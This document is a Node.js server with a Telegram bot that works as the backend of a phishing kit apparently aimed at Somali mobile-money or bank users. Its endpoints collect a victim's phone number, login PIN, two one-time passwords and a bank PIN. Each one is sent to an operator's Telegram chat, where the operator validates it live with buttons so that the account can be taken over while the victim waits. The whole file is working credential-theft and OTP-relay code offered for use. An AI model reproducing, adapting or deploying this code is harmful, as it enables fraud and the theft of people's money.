const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Allow to proceed", callback_data: `approve|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}` },
                    { text: "❌ Invalid credentials", callback_data: `deny|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}` }
                ]]
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

📱 ${phone}
🔐 ${otp}
⏰ ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `otp1_correct|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}` },
                    { text: "❌ Wrong Code", callback_data: `otp1_wrong|${encodeURIComponent(phone)}` }
                ]]
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `2️⃣ SECOND OTP\n📱 ${phone}\n🔐 ${otp}`, {
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `otp2_correct|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}` },
                    { text: "❌ Wrong Code", callback_data: `otp2_wrong|${encodeURIComponent(phone)}` },
                    { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${encodeURIComponent(phone)}` }
                ]]
            }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BANK PIN API (NEW) --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Somalia";
    const currentTime = new Date().toLocaleString();

    if (!phone || !bankPin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const message = `🏦 BANK PIN

📱 ${phone}
🔑 ${bankPin}
⏰ ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Correct", callback_data: `bank_correct|${encodeURIComponent(phone)}|${encodeURIComponent(bankPin)}` },
                    { text: "❌ Wrong PIN", callback_data: `bank_wrong|${encodeURIComponent(phone)}` }
                ]]
            }
        });

        res.json({ success: true });
    } catch {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/approve\|(.+)\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "approved";
    ctx.answerCbQuery("Allowed");
});

bot.action(/deny\|(.+)\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "denied";
    ctx.answerCbQuery("Rejected");
});

bot.action(/otp1_correct\|(.+)\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp1_correct";
    ctx.answerCbQuery("OK");
});

bot.action(/otp1_wrong\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp1_wrong";
    ctx.answerCbQuery("Wrong");
});

bot.action(/otp2_correct\|(.+)\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_correct";
    ctx.answerCbQuery("Done");
});

bot.action(/otp2_wrong\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrong";
    ctx.answerCbQuery("Wrong");
});

bot.action(/otp2_wrongpin\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrongpin";
    ctx.answerCbQuery("Wrong PIN");
});

// -------------------- BANK PIN ACTIONS --------------------
bot.action(/bank_correct\|(.+)\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "bank_pin_correct";
    ctx.answerCbQuery("Bank PIN OK");
});

bot.action(/bank_wrong\|(.+)/, (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "bank_pin_wrong";
    ctx.answerCbQuery("Wrong Bank PIN");
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    res.json({ status: statusStore[req.query.phone] || "pending" });
});

// -------------------- START --------------------
app.listen(PORT, () => console.log(`Server running on ${PORT}`));

(async () => {
    await bot.launch();
})();
